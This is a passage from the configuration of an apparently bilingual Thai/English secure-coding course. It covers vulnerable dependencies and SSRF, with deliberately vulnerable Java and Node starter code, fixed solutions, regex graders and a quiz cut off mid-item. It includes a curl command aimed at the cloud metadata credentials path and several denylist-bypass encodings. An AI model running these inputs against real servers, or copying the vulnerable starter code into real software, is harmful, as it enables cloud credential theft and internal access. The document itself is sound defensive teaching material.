          { pkg: 'org.apache.logging.log4j:log4j-core', eco: 'java', installed: '2.14.1', cve: 'CVE-2021-44228', severity: 'Critical', cvss: 10.0, fixedIn: '2.17.1', note: 'Log4Shell — remote code execution via ${jndi:ldap://...} in any logged string' },
          { pkg: 'com.fasterxml.jackson.core:jackson-databind', eco: 'java', installed: '2.9.8', cve: 'CVE-2020-36518', severity: 'High', cvss: 7.5, fixedIn: '2.12.6.1', note: 'Denial of service — deeply nested JSON causes a stack overflow' },
          { pkg: 'commons-collections:commons-collections', eco: 'java', installed: '3.2.1', cve: 'CVE-2015-6420', severity: 'High', cvss: 7.5, fixedIn: '3.2.2', note: 'Java deserialization RCE via the InvokerTransformer gadget chain (ysoserial CommonsCollections)' },
          { pkg: 'lodash', eco: 'node', installed: '4.17.4', cve: 'CVE-2019-10744', severity: 'Critical', cvss: 9.8, fixedIn: '4.17.12', note: 'Prototype pollution in defaultsDeep pollutes Object.prototype for the whole process' },
          { pkg: 'jsonwebtoken', eco: 'node', installed: '0.4.0', cve: 'CVE-2015-9235', severity: 'High', cvss: 8.1, fixedIn: '4.2.2', note: 'Algorithm confusion — accepts alg:none and RS256->HS256, allowing token forgery' },
          { pkg: 'axios', eco: 'node', installed: '0.18.0', cve: 'CVE-2019-10742', severity: 'High', cvss: 7.5, fixedIn: '0.18.1', note: 'Denial of service — keeps accepting data past maxContentLength, exhausting memory' }
        ]
      },
      payloads: [
        { label: { th: 'สแกนทุก dependency เพื่อดูช่องโหว่ที่มีคนรู้แล้ว', en: 'Full scan — every known finding' }, value: 'all' },
        { label: { th: 'เฉพาะ ecosystem Java (Maven)', en: 'Java ecosystem only (Maven)' }, value: 'java' },
        { label: { th: 'เฉพาะ ecosystem Node (npm)', en: 'Node ecosystem only (npm)' }, value: 'node' }
      ],
      allowCustom: true
    },

    references: [
      { label: 'OWASP Vulnerable Dependency Management Cheat Sheet', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Vulnerable_Dependency_Management_Cheat_Sheet.html' },
      { label: 'OWASP Top 10 — A06:2021 Vulnerable and Outdated Components', url: 'https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/' },
      { label: 'CWE-1104: Use of Unmaintained Third Party Components', url: 'https://cwe.mitre.org/data/definitions/1104.html' }
    ]
  };

 /* ======================================================================
 * 4.3 Server-Side Request Forgery (SSRF)
 * ==================================================================== */
  const SSRF = {
    id: 'ssrf',
    title: { th: 'Server-Side Request Forgery (SSRF)', en: 'Server-Side Request Forgery (SSRF)' },
    severity: 'Critical',
    cwe: 'CWE-918',
    owasp: 'A10:2021 – Server-Side Request Forgery (SSRF)',
    category: { th: 'SSRF', en: 'SSRF' },
    estMinutes: 16,
    points: 150,

    intro: {
      th: 'ฟีเจอร์ "link preview" รับ URL จากผู้ใช้แล้วให้ server ยิง request ไปดึงเนื้อหากลับมา ปมอยู่ที่ server ยอมยิงไปที่ URL อะไรก็ได้ที่ผู้ใช้พิมพ์ attacker เลยหลอกให้ server ของคุณยิง request ไปยังปลายทางภายในที่ตัวเขาเข้าไม่ถึง เช่น instance metadata service ของคลาวด์ (169.254.169.254), บริการภายในที่ไม่มี auth, หรือพอร์ตที่ผูกไว้แค่ localhost request ออกจาก "ข้างใน" trust boundary ของคุณ มันเลยข้าม firewall และ network policy ไปได้ทั้งหมด',
      en: 'A "link preview" feature takes a URL from the user and has the server fetch its content. The problem is the server will fetch any URL the user types. An attacker abuses this to make your server send requests to internal destinations they cannot reach themselves: the cloud instance metadata service (169.254.169.254), internal services with no auth, or ports bound only to localhost. Because the request originates from inside your trust boundary, it sails past your firewall and network policies.'
    },
    attack: {
      th: 'บนคลาวด์ (เช่น AWS) attacker ส่ง url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ server ของคุณยิงไปที่ instance metadata service แล้วคืน temporary credentials ของ IAM role ที่ผูกกับเครื่องกลับมาให้ attacker เอาไปใช้ aws s3 ls / เข้าถึงทรัพยากรคลาวด์ด้วย privilege ของแอปคุณ เทคนิคเลี่ยง denylist: ใช้ http://[::1]/, http://2130706433/ (127.0.0.1 แบบเลขฐานสิบ), http://0177.0.0.1/ (ฐานแปด), ตั้งชื่อ DNS ให้ชี้กลับเข้า private IP หรือใช้ 302 redirect จากปลายทางที่ allowlist ผ่านเข้า metadata service',
      en: 'On the cloud (e.g. AWS) the attacker sends url=http://169.254.169.254/latest/meta-data/iam/security-credentials/. Your server fetches the instance metadata service and returns the machine\'s IAM-role temporary credentials, which the attacker uses for aws s3 ls / access to cloud resources with your app\'s privileges. Denylist bypasses: http://[::1]/, http://2130706433/ (decimal 127.0.0.1), http://0177.0.0.1/ (octal), a DNS name that resolves to a private IP, or a 302 redirect from an allowlisted host into the metadata service.'
    },
    fix: {
      th: 'ยึดหลัก allowlist ไม่ใช่ denylist และ "ตรวจสิ่งที่จะเชื่อมต่อจริง" ไม่ใช่แค่สตริง: (1) parse URL ด้วยตัว parser มาตรฐาน (2) ยอมเฉพาะ scheme http/https (3) เทียบ host กับ allowlist ของปลายทางที่ตั้งใจให้ยิงได้ (4) resolve host เป็น IP จริงแล้วเช็คว่าไม่ใช่ loopback/link-local/RFC1918/CGNAT ก่อนยิง และ (5) ปิดการตาม redirect (maxRedirects: 0 / Redirect.NEVER) เพราะ 302 คือช่องที่ข้าม allowlist ได้ ตัวจริงที่ปิดช่องคือการเช็ค IP หลัง resolve ไม่ใช่การแบนคำว่า localhost',
      en: 'Use an allowlist, not a denylist, and validate what you will actually connect to, not just the string: (1) parse the URL with a standard parser; (2) allow only the http/https scheme; (3) match the host against an allowlist of intended destinations; (4) resolve the host to its real IP and confirm it is not loopback/link-local/RFC1918/CGNAT before connecting; and (5) disable redirect following (maxRedirects: 0 / Redirect.NEVER), because a 302 is the way around an allowlist. What truly closes the hole is checking the resolved IP, not banning the word "localhost".'
    },
    keyPoints: {
      vuln: [
        { th: 'server ยอมยิง request ไป URL อะไรก็ได้ที่ผู้ใช้พิมพ์เข้ามา', en: 'The server will fetch any URL the user types in' },
        { th: 'request ออกจากในวง trust ของคุณ จึงข้าม firewall และ network policy ไปได้', en: 'The request comes from inside your trust boundary, so it bypasses firewalls and policy' },
        { th: 'ปลายทางภายในที่ attacker ยิงเองไม่ถึง เช่น metadata service กลับเข้าถึงได้', en: 'Internal targets the attacker cannot reach, like the metadata service, become reachable' }
      ],
      attack: [
        { th: 'attacker ใส่ url=http://169.254.169.254/... แล้ว server เป็นผู้ส่ง request ไปยัง metadata service แทน หากไม่มีการป้องกัน response อาจมี credential ของ IAM role กลับมา', en: 'url=http://169.254.169.254/... makes the server return the IAM role credentials' },
        { th: 'denylist ที่บล็อกคำว่า localhost หรือ 127.0.0.1 หลบได้ด้วยรูปแบบ IP อื่น เช่น [::1] หรือเลขฐานสิบ 2130706433 ซึ่งยังหมายถึงปลายทางภายใน', en: 'http://[::1] or 2130706433 (decimal 127.0.0.1) slips past a denylist' },
        { th: 'attacker อาจใช้ DNS ที่ resolve ไปยัง private IP หรือใช้ 302 redirect จาก host ที่ผ่าน allowlist เพื่อพา request ต่อไปยัง metadata service', en: 'A DNS name pointing at a private IP, or a 302 from an allowlisted host, bypasses it' }
      ],
      fix: [
        { th: 'ใช้ allowlist ระบุ host ที่ระบบอนุญาตให้เชื่อมต่อเท่านั้น แทนการทำ denylist ไล่บล็อกชื่ออย่าง localhost ซึ่งมีรูปแบบหลบได้หลายแบบ', en: 'Use an allowlist of intended hosts, not a denylist of localhost' },
        { th: 'resolve hostname เป็น IP จริงก่อนเชื่อมต่อ แล้วปฏิเสธ loopback, link-local และ private IP เช่น 127.x, 169.254.x, 10.x และช่วง RFC1918 อื่น', en: 'Resolve the host to its real IP and reject loopback/link-local/RFC1918 before connecting' },
        { th: 'ปิดการตาม redirect เช่น maxRedirects: 0 หรือ Redirect.NEVER เพื่อไม่ให้ปลายทางที่ผ่าน allowlist redirect ต่อไปยัง host ภายในที่ไม่อนุญาต', en: 'Disable redirect following (maxRedirects: 0 / Redirect.NEVER); a 302 escapes the allowlist' }
      ]
    },
    impact: {
      th: 'ในระบบ cloud SSRF อาจใช้เข้าถึง metadata service และขโมย credential ของ IAM role จากนั้น attacker อาจใช้สิทธิ์ของแอปเข้าถึง S3, database หรือทรัพยากรภายในอื่นต่อได้',
      en: 'SSRF in a cloud environment typically ends with stolen IAM-role credentials via the metadata service, giving the attacker access to S3, databases, and internal resources with your application\'s privileges.'
    },

    caseStudy: {
      year: 2019,
      title: {
        th: 'Capital One (2019) — SSRF สู่ EC2 metadata service กระทบข้อมูลราว 100 ล้านราย',
        en: 'Capital One (2019) — SSRF to the EC2 metadata service, ~100 million records'
      },
      body: {
        th: 'เดือนกรกฎาคม 2019 Capital One เปิดเผยเหตุข้อมูลรั่วครั้งใหญ่ ผู้ก่อเหตุ (Paige Thompson) ใช้ช่องโหว่ SSRF ผ่าน WAF ที่ตั้งค่าผิดเพื่อให้ server ส่ง request ไปยัง EC2 instance metadata service ที่ 169.254.169.254 แล้วได้ temporary credentials ของ IAM role ที่ผูกกับเครื่อง จากนั้นใช้ credentials นั้นดึงข้อมูลจากบัคเก็ต S3 ออกไป กระทบข้อมูลลูกค้าและผู้สมัครบัตรเครดิตราว 100 ล้านรายในสหรัฐฯ และราว 6 ล้านรายในแคนาดา ต่อมา Thompson ถูกคณะลูกขุนตัดสินว่าผิดในเดือนมิถุนายน 2022 บทเรียนคือค่า metadata endpoint ภายในที่ "เข้าถึงจากภายนอกไม่ได้" กลับเข้าถึงได้ทันทีเมื่อมี SSRF',
        en: 'In July 2019 Capital One disclosed a major breach. The perpetrator (Paige Thompson) used an SSRF flaw through a misconfigured WAF to make a server request the EC2 instance metadata service at 169.254.169.254, obtaining the machine\'s IAM-role temporary credentials, then used those to pull data from S3 buckets. The breach affected roughly 100 million customers and card applicants in the US and about 6 million in Canada. Thompson was found guilty by a jury in June 2022. The lesson: an internal metadata endpoint that is "unreachable from outside" becomes instantly reachable once SSRF exists.'
      },
      source: {
        label: 'U.S. DOJ — Former Seattle tech worker convicted of wire fraud and computer intrusions (2022)',
        url: 'https://www.justice.gov/usao-wdwa/pr/former-seattle-tech-worker-convicted-wire-fraud-and-computer-intrusions'
      }
    },

    codeReview: [
      {
        th: 'ถ้าเห็น HTTP client (RestTemplate, HttpClient, WebClient, axios, fetch, http.get) รับ URL มาจาก req.query/req.body โดยตรง ให้ตรวจต่อ จุดที่แอปส่ง request ตาม URL ของผู้ใช้คือจุดที่ SSRF เกิด',
        en: 'grep for an HTTP client (RestTemplate, HttpClient, WebClient, axios, fetch, request, http.get) taking a URL straight from req.query/req.body/user parameters — that is where SSRF lives.'
      },
      {
        th: 'เห็นการกันแบบ denylist คือไล่บล็อก "localhost"/"127.0.0.1"/"169.254..." ให้ตรวจต่อ เพราะเขียน IP อีกแบบก็หลบได้ ต้องพลิกเป็น allowlist ของ host ที่อนุญาตแทน',
        en: 'Check for denylist-style filtering (blocking "localhost"/"127.0.0.1"/"169.254...") — if present, that is the wrong approach; it must be an allowlist of permitted hosts.'
      },
      {
        th: 'ตรวจว่าโค้ด resolve host เป็น IP จริงและปฏิเสธช่วง internal ก่อนส่ง request หรือยัง ถ้าตรวจเพียง hostname เป็นสตริง อาจถูกหลบด้วย DNS ที่ชี้กลับเข้า private IP (DNS rebinding)',
        en: 'Look for whether the host is resolved to a real IP and checked against internal ranges before connecting (checking only the hostname string is bypassed by DNS rebinding / DNS pointing at a private IP).'
      },
      {
        th: 'ตรวจว่าปิดการตาม redirect หรือยัง เช่น maxRedirects: 0 หรือ Redirect.NEVER เพราะ host ที่ผ่าน allowlist อาจตอบ 302 แล้ว redirect ต่อไปยัง metadata service หรือปลายทางภายใน',
        en: 'Verify redirect following is disabled (maxRedirects: 0 / Redirect.NEVER) — a 302 from an allowlisted host can lead into the metadata service.'
      }
    ],

    testIt: {
      cmd: "curl -s 'http://localhost:3000/api/link-preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'",
      note: {
        th: 'แอปที่มีช่องโหว่จะส่งเนื้อหาจาก metadata service กลับมา ส่วนแอปที่แก้แล้วควรตอบ 400 เมื่อ host ไม่อยู่ใน allowlist หรือ resolve แล้วเป็น IP ภายใน ลองเทียบกับ URL ที่อนุญาต เช่น https://api.partner.example.com/... ซึ่งยังต้องใช้งานได้ตามปกติ เพื่อยืนยันว่าระบบบล็อกเฉพาะปลายทางที่ไม่ควรเข้าถึง',
        en: 'A vulnerable app returns content from the metadata service (on a real cloud, the credentials index); a fixed app answers 400 because the host is not in the allowlist or resolves to link-local. Compare with an allowlisted url such as https://api.partner.example.com/..., which the fixed side still permits — showing it blocks only the destinations it should, without breaking the feature.'
      }
    },

    pitfalls: [
      {
        title: {
          th: 'block localhost กับ 127.0.0.1',
          en: '"I block localhost and 127.0.0.1, so SSRF should be handled"'
        },
        why: {
          th: 'denylist ของสตริงเลี่ยงได้หลายทางเกินกว่าจะไล่ปิดหมด: [::1] (IPv6 loopback), 2130706433 (127.0.0.1 เป็นเลขฐานสิบ), 0177.0.0.1 (ฐานแปด), 127.1 (short form), ชื่อ DNS ที่คุณคุมไม่ได้ชี้กลับเข้า private IP (เช่น *.nip.io) และที่ร้ายที่สุดคือ TOCTOU/DNS rebinding — คุณเช็ค hostname ตอนหนึ่ง แต่ตอน HTTP client ต่อจริงมัน resolve ใหม่เป็น IP ภายใน หรือปลายทางตอบ 302 redirect เข้า 169.254.169.254 ทางที่ถูกคือ allowlist ของ host + resolve เป็น IP จริงแล้วเช็คช่วง internal + ปิด redirect',
          en: 'A string denylist has too many bypasses to enumerate: [::1] (IPv6 loopback), 2130706433 (decimal 127.0.0.1), 0177.0.0.1 (octal), 127.1 (short form), a DNS name you do not control pointing back at a private IP (e.g. *.nip.io), and worst of all TOCTOU/DNS rebinding — you check the hostname at one moment, but when the HTTP client actually connects it re-resolves to an internal IP, or the destination answers a 302 into 169.254.169.254. The right way is a host allowlist + resolving to the real IP and checking internal ranges + disabling redirects.'
        },
        short: {
          th: 'denylist ของสตริงเลี่ยงได้สารพัดทาง ต้อง allowlist แล้วตรวจ IP จริงหลัง resolve',
          en: 'A string denylist has endless bypasses; allowlist and check the resolved IP instead'
        }
      },
      {
        title: {
          th: 'ปล่อยผ่านเพราะเป็นบริการภายใน',
          en: '"It is an internal service — nobody can reach it anyway"'
        },
        why: {
          th: 'SSRF ทำลายสมมติฐานนี้ทั้งข้อ ความ "เข้าถึงไม่ได้จากข้างนอก" ของบริการภายในตั้งอยู่บนสมมติฐานว่า request มาจากภายนอก แต่ SSRF ทำให้ request ออกมาจาก "ข้างในวง" ของคุณเอง firewall/security group ที่อนุญาต egress ภายในอยู่แล้วจึงไม่ช่วย และบริการภายในจำนวนมากไม่ทำ auth เพราะเชื่อว่า "อยู่หลัง firewall แล้ว" SSRF เลยกลายเป็นกุญแจเปิดทุกประตูภายใน อย่าพึ่ง network boundary อย่างเดียว ต้อง validate ปลายทางที่ชั้นแอปด้วย',
          en: 'SSRF breaks this assumption entirely. An internal service\'s "unreachable from outside" rests on requests coming from outside — but SSRF makes the request come from inside your own network. Firewalls/security groups that already permit internal egress do not help, and many internal services skip auth because they trust "we are behind the firewall". SSRF then becomes a key to every internal door. Do not rely on the network boundary alone; validate the destination at the application layer too.'
        },
        short: {
          th: 'SSRF ทำให้ request มาจากในวง บริการภายในที่ไม่มี auth จึงถูกเข้าถึงได้',
          en: 'SSRF makes the request come from inside; unauthenticated internal services become reachable'
        }
      }
    ],

    languages: {
      java: {
        filename: 'LinkPreviewController.java',
        lang: 'java',
        starter:
`package com.acme.media.web;

import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

@RestController
public class LinkPreviewController {

    private final HttpClient http = HttpClient.newHttpClient();

 // ดึงเมทาดาทาจาก URL ที่ผู้ใช้วางมาเพื่อทำ link preview
    @GetMapping("/api/link-preview")
    public String preview(@RequestParam("url") String url) throws Exception {
        HttpRequest req = HttpRequest.newBuilder(URI.create(url)).build();
        HttpResponse<String> res = http.send(req, HttpResponse.BodyHandlers.ofString());
        return res.body();   // ส่งเนื้อหาที่ดึงมากลับให้ผู้เรียกทั้งหมด
    }
}`,
        solution:
`package com.acme.media.web;

import java.net.InetAddress;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.util.Set;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

@RestController
public class LinkPreviewController {

 // ปิดการตาม redirect: 302 ไป http://169.254.169.254 จะได้ไม่หลุด allowlist
    private final HttpClient http = HttpClient.newBuilder()
        .followRedirects(HttpClient.Redirect.NEVER)
        .build();
    private static final Set<String> ALLOW_HOSTS =
        Set.of("api.partner.example.com", "cdn.example.com");

    @GetMapping("/api/link-preview")
    public String preview(@RequestParam("url") String raw) throws Exception {
        URI u = URI.create(raw);
        String scheme = u.getScheme() == null ? "" : u.getScheme().toLowerCase();
        if (!scheme.equals("https")) throw new SecurityException("scheme not allowed");
        String host = u.getHost() == null ? "" : u.getHost().toLowerCase();
        if (!ALLOW_HOSTS.contains(host)) throw new SecurityException("host not allowed");
 // resolve เป็น IP จริง แล้วเช็คว่าไม่ใช่ปลายทางภายใน กัน DNS ที่ชี้เข้าวง
        for (InetAddress ip : InetAddress.getAllByName(host)) {
            if (ip.isLoopbackAddress() || ip.isLinkLocalAddress()
                    || ip.isSiteLocalAddress() || ip.isAnyLocalAddress()) {
                throw new SecurityException("resolves to internal address");
            }
        }
        HttpRequest req = HttpRequest.newBuilder(URI.create(raw)).build();
        HttpResponse<String> res = http.send(req, HttpResponse.BodyHandlers.ofString());
        return res.body();
    }
}`,
        explain: {
          th: 'โค้ดตรวจ 4 ชั้นก่อนส่ง request จริง: (1) scheme ต้องเป็น https เท่านั้น ตัด file:/gopher:/dict: ที่ใช้โจมตีทิ้ง (2) host ต้องอยู่ใน ALLOW_HOSTS เท่านั้น เป็น allowlist ไม่ใช่ denylist (3) resolve host ด้วย InetAddress.getAllByName แล้วตรวจทุก IP ที่ได้ว่าไม่ใช่ loopback/link-local/site-local/any-local — นี่คือหัวใจที่กัน DNS ที่ชี้กลับเข้า private IP และ metadata service (169.254.169.254) และ (4) สร้าง HttpClient ด้วย Redirect.NEVER เพื่อไม่ให้ 302 redirect ไปยังปลายทางภายใน จุดสำคัญคือเราตรวจ "IP ที่จะเชื่อมต่อจริง" ไม่ใช่แค่สตริง hostname',
          en: 'The code validates four layers before connecting: (1) the scheme must be https, dropping the file:/gopher:/dict: schemes used in attacks; (2) the host must be in ALLOW_HOSTS — an allowlist, not a denylist; (3) it resolves the host with InetAddress.getAllByName and checks every returned IP against loopback/link-local/site-local/any-local — the crux that stops DNS pointing back at a private IP or the metadata service (169.254.169.254); and (4) it builds the HttpClient with Redirect.NEVER so a 302 cannot lead into an internal destination. The key is validating the IP it will actually connect to, not just the hostname string.'
        },
        checks: [
          {
            id: 'host-allowlist',
            label: { th: 'ตรวจ host กับ allowlist ก่อนยิง', en: 'Checks the host against an allowlist before fetching' },
            hint: { th: 'เก็บ host ที่อนุญาตไว้ใน Set แล้วเช็ค ALLOW_HOSTS.contains(host)', en: 'Keep allowed hosts in a Set and check ALLOW_HOSTS.contains(host)' },
            weight: 3,
            mustMatch: /\.contains\s*\(\s*host\s*\)/
          },
          {
            id: 'resolve-and-check-ip',
            label: { th: 'resolve เป็น IP จริงแล้วเช็คว่าไม่ใช่ปลายทางภายใน', en: 'Resolves to a real IP and rejects internal addresses' },
            hint: { th: 'ใช้ InetAddress.getAllByName(host) แล้วเช็ค isLoopback/isLinkLocal/isSiteLocalAddress', en: 'Use InetAddress.getAllByName(host) then check isLoopback/isLinkLocal/isSiteLocalAddress' },
            weight: 3,
            mustMatch: /isLoopbackAddress|isSiteLocalAddress|isLinkLocalAddress/
          },
          {
            id: 'no-redirect-follow',
            label: { th: 'ปิดการตาม redirect (Redirect.NEVER)', en: 'Disables redirect following (Redirect.NEVER)' },
            hint: { th: 'สร้าง HttpClient ด้วย.followRedirects(HttpClient.Redirect.NEVER)', en: 'Build the HttpClient with .followRedirects(HttpClient.Redirect.NEVER)' },
            weight: 2,
            mustMatch: /Redirect\.NEVER/
          },
          {
            id: 'scheme-check',
            label: { th: 'ยอมเฉพาะ scheme ที่ปลอดภัย (https)', en: 'Allows only a safe scheme (https)' },
            hint: { th: 'ดึง u.getScheme() แล้วเช็ค equals("https")', en: 'Read u.getScheme() and check equals("https")' },
            weight: 2,
            mustMatch: /getScheme\s*\(\s*\)|equals\s*\(\s*"https"\s*\)/
          }
        ],
        traps: [
          {
            id: 'denylist-localhost',
            match: /(?:equals|equalsIgnoreCase|contains|indexOf|startsWith)\s*\(\s*"(?:localhost|127\.0\.0\.1)"/,
            message: {
              th: 'การแบนสตริง "localhost"/"127.0.0.1" เป็น denylist ที่เลี่ยงได้ด้วย [::1], 2130706433, 0177.0.0.1, 127.1 หรือ DNS ที่ชี้กลับเข้า private IP ให้ใช้ allowlist ของ host + resolve เป็น IP จริงแล้วเช็คช่วง internal แทน',
              en: 'Banning the strings "localhost"/"127.0.0.1" is a denylist bypassed by [::1], 2130706433, 0177.0.0.1, 127.1, or DNS pointing back at a private IP. Use a host allowlist + resolve to the real IP and check internal ranges instead.'
            }
          },
          {
            id: 'denylist-metadata-ip',
            match: /(?:equals|contains|indexOf|startsWith)\s*\(\s*"169\.254/,
            message: {
              th: 'การแบนเฉพาะสตริง "169.254..." ยังเลี่ยงได้ด้วยเลขฐานสิบ/ฐานแปด/IPv6 และ DNS rebinding อีกทั้งไม่ครอบคลุมปลายทางภายในอื่น ๆ (RFC1918, loopback) ต้อง resolve แล้วเช็ค "ช่วง IP" ไม่ใช่แบนทีละสตริง',
              en: 'Banning only the string "169.254..." is still bypassed by decimal/octal/IPv6 encodings and DNS rebinding, and misses other internal destinations (RFC1918, loopback). You must resolve and check IP ranges, not ban strings one by one.'
            }
          }
        ]
      },

      node: {
        filename: 'linkPreview.js',
        lang: 'js',
        starter:
`const express = require('express');
const axios = require('axios');

const router = express.Router();

// ทำ link preview จาก URL ที่ผู้ใช้วางมา
router.get('/api/link-preview', async function (req, res) {
  const url = req.query.url;
  const resp = await axios.get(url);   // ยิงคำขอไปยัง URL ตรง ๆ
  res.send(resp.data);
});

module.exports = router;`,
        solution:
`const express = require('express');
const axios = require('axios');
const dns = require('dns').promises;
const net = require('net');

const router = express.Router();

const ALLOW_HOSTS = ['api.partner.example.com', 'cdn.example.com'];

// คืน true ถ้า IP อยู่ในวงภายใน (loopback / link-local / RFC1918 / ULA)
function isPrivateIp(ip) {
  if (net.isIPv4(ip)) {
    const p = ip.split('.').map(Number);
    if (p[0] === 127 || p[0] === 10 || p[0] === 0) return true;
    if (p[0] === 169 && p[1] === 254) return true;              // link-local / metadata
    if (p[0] === 172 && p[1] >= 16 && p[1] <= 31) return true;  // RFC1918
    if (p[0] === 192 && p[1] === 168) return true;              // RFC1918
    return false;
  }
  return ip === '::1' || /^fe80:/i.test(ip) || /^f[cd]/i.test(ip);
}

router.get('/api/link-preview', async function (req, res) {
  let u;
  try { u = new URL(req.query.url); } catch (e) { return res.status(400).send('bad url'); }
  if (u.protocol !== 'https:') return res.status(400).send('scheme not allowed');
  if (ALLOW_HOSTS.indexOf(u.hostname) === -1) return res.status(400).send('host not allowed');
 // resolve เป็น IP จริง แล้วเช็คว่าไม่ชี้กลับเข้าวงภายใน (กัน DNS rebinding)
  const records = await dns.lookup(u.hostname, { all: true });
  if (records.some(function (r) { return isPrivateIp(r.address); })) {
    return res.status(400).send('resolves to internal address');
  }
 // ปิดการตาม redirect: 302 เข้า metadata service จะได้ไม่หลุด allowlist
  const resp = await axios.get(u.toString(), { maxRedirects: 0 });
  res.send(resp.data);
});

module.exports = router;`,
        explain: {
          th: 'ค่า URL ถูก parse ด้วย new URL() ที่เป็น parser มาตรฐาน จากนั้นตรวจ 4 ชั้น: (1) protocol ต้องเป็น https: (2) hostname ต้องอยู่ใน ALLOW_HOSTS (3) dns.lookup แบบ all:true แล้วตรวจทุก record ด้วย isPrivateIp เพื่อกัน DNS ที่ชี้เข้า 127.x, 169.254.x, 10.x, 172.16–31.x, 192.168.x และ IPv6 ภายใน และ (4) axios.get ด้วย maxRedirects: 0 ปิดไม่ให้ 302 พาเข้า metadata service หัวใจอยู่ที่การตรวจ "IP ที่จะต่อจริง" หลัง resolve ไม่ใช่การแบน hostname เป็นสตริง',
          en: 'The URL is parsed with new URL(), a standard parser, then validated in four layers: (1) the protocol must be https:; (2) the hostname must be in ALLOW_HOSTS; (3) dns.lookup with all:true and every record checked by isPrivateIp to stop DNS pointing at 127.x, 169.254.x, 10.x, 172.16–31.x, 192.168.x and internal IPv6; and (4) axios.get with maxRedirects: 0 so a 302 cannot lead into the metadata service. The crux is checking the IP it will actually connect to after resolution, not banning the hostname string.'
        },
        checks: [
          {
            id: 'url-parse',
            label: { th: 'parse URL ด้วย new URL()', en: 'Parses the URL with new URL()' },
            hint: { th: 'ใช้ new URL(req.query.url) แล้วอ่าน protocol/hostname จากผลลัพธ์', en: 'Use new URL(req.query.url) and read protocol/hostname from it' },
            weight: 2,
            mustMatch: /new URL\s*\(/
          },
          {
            id: 'host-allowlist',
            label: { th: 'ตรวจ hostname กับ allowlist', en: 'Checks the hostname against an allowlist' },
            hint: { th: 'เก็บ host ที่อนุญาตไว้ใน array แล้วเช็ค ALLOW_HOSTS.indexOf(hostname)', en: 'Keep allowed hosts in an array and check ALLOW_HOSTS.indexOf(hostname)' },
            weight: 3,
            mustMatch: /ALLOW_HOSTS\.(?:indexOf|includes)|allow[A-Za-z]*\.(?:indexOf|includes)/
          },
          {
            id: 'block-private-ip',
            label: { th: 'resolve แล้วบล็อก IP ภายใน (loopback/link-local/RFC1918)', en: 'Resolves and blocks internal IPs (loopback/link-local/RFC1918)' },
            hint: { th: 'ใช้ dns.lookup แล้วเช็คช่วง IP ภายในด้วยฟังก์ชันอย่าง isPrivateIp', en: 'Use dns.lookup then check internal ranges with something like isPrivateIp' },
            weight: 3,
            mustMatch: /isPrivateIp|isLoopback|isSiteLocalAddress|dns\.(?:lookup|resolve)/
          },
          {
            id: 'no-redirects',
            label: { th: 'ปิดการตาม redirect (maxRedirects: 0)', en: 'Disables redirect following (maxRedirects: 0)' },
            hint: { th: 'ส่ง { maxRedirects: 0 } เข้า axios.get()', en: 'Pass { maxRedirects: 0 } to axios.get()' },
            weight: 2,
            mustMatch: /maxRedirects\s*:\s*0/
          },
          {
            id: 'scheme-check',
            label: { th: 'ยอมเฉพาะ scheme ที่ปลอดภัย (https:)', en: 'Allows only a safe scheme (https:)' },
            hint: { th: 'เช็ค u.protocol !== "https:" แล้วปฏิเสธ', en: 'Check u.protocol !== "https:" and reject' },
            weight: 2,
            mustMatch: /protocol\s*(?:!==|===)\s*['"]https:['"]/
          }
        ],
        traps: [
          {
            id: 'denylist-localhost',
            match: /(?:===|==|includes|indexOf|startsWith)\s*\(?\s*['"](?:localhost|127\.0\.0\.1)['"]/,
            message: {
              th: 'การแบนสตริง "localhost"/"127.0.0.1" เป็น denylist ที่เลี่ยงได้ด้วย [::1], 2130706433, 0177.0.0.1, 127.1 หรือ DNS ที่ชี้กลับเข้า private IP ให้ใช้ allowlist ของ host + dns.lookup แล้วเช็คช่วง IP ภายในแทน',
              en: 'Banning the strings "localhost"/"127.0.0.1" is a denylist bypassed by [::1], 2130706433, 0177.0.0.1, 127.1, or DNS pointing back at a private IP. Use a host allowlist + dns.lookup and check internal IP ranges instead.'
            }
          },
          {
            id: 'denylist-metadata-string',
            match: /['"]169\.254\.169\.254['"]/,
            message: {
              th: 'การแบนเฉพาะสตริง "169.254.169.254" ยังเลี่ยงได้ด้วยเลขฐานสิบ/ฐานแปด/IPv6 และ DNS rebinding อีกทั้งไม่ครอบคลุม RFC1918/loopback ต้อง resolve แล้วเช็คช่วง IP ไม่ใช่แบนทีละสตริง',
              en: 'Banning only the string "169.254.169.254" is still bypassed by decimal/octal/IPv6 encodings and DNS rebinding, and misses RFC1918/loopback. Resolve and check IP ranges, not individual strings.'
            }
          }
        ]
      }
    },

    hints: [
      {
        th: 'ลองถามตัวเองว่า "ปลายทางที่โค้ดนี้จะไปคุยด้วยคือใครได้บ้าง" ถ้าคำตอบคือ "อะไรก็ได้ที่ผู้ใช้พิมพ์" นั่นคือช่องโหว่',
        en: 'Ask "who can this code end up talking to?" If the answer is "anything the user types", that is the vulnerability.'
      },
      {
        th: 'อย่าเชื่อ hostname เป็นสตริง ต้อง resolve เป็น IP จริงก่อน แล้วตรวจว่าไม่ใช่ loopback/link-local/RFC1918 และอย่าลืมปิดการตาม redirect',
        en: 'Do not trust the hostname as a string — resolve it to a real IP first and check it is not loopback/link-local/RFC1918, and do not forget to disable redirect following.'
      },
      {
        th: 'Java: URI parse + allowlist host + InetAddress.getAllByName + isLoopback/isSiteLocal/isLinkLocal + Redirect.NEVER — Node: new URL() + allowlist + dns.lookup + ตรวจช่วง IP ภายใน + maxRedirects: 0',
        en: 'Java: URI parse + host allowlist + InetAddress.getAllByName + isLoopback/isSiteLocal/isLinkLocal + Redirect.NEVER. Node: new URL() + allowlist + dns.lookup + internal-range check + maxRedirects: 0.'
      }
    ],

    quiz: [
      {
        q: {
          th: 'เพื่อกัน SSRF ทีม block คำว่า "localhost" และ "127.0.0.1" ในค่า URL เพียงพอหรือไม่',
          en: 'To prevent SSRF, the team blocks "localhost" and "127.0.0.1" in the URL value. Is that enough?'
        },
        choices: [
